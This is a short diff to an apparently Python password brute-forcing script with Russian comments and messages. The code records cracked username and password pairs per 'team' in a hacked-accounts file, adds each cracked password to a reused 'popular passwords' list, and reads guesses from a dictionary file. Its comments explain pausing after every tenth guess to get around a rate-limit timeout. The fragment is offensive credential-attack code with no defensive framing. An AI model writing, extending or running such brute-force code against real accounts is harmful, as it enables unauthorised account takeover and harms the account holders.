@@ -77,13 +77,16 @@ def start(passwords):
                 with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:
                     h_list.write(f"{get_ts()} {username}: {password} \n")
 
+                with open(f"{PASSWORDS_POPULAR_PATH}", "a", encoding="utf-8") as mb_list: # сохраняем взломанный пароль в пароли типа МБ
+                    mb_list.write(f"{password} \n")
+
             time.sleep(5)
             if k % 10 == 0:
                 time.sleep(HACKMULTIPART_TIMEOUT)  # ждем потому что таймаут после каждого 10 подбора
 
 
 if __name__ == "__main__":
-    with open("passwords.txt", "r", encoding="utf-8") as passwords:
+    with open(f"{PASSWORDS_DICT_PATH}", "r", encoding="utf-8") as passwords:
         start(passwords.readlines())
     print(green + "[+] Готово.")
     input(magenta + "[?] Продолжить? ")
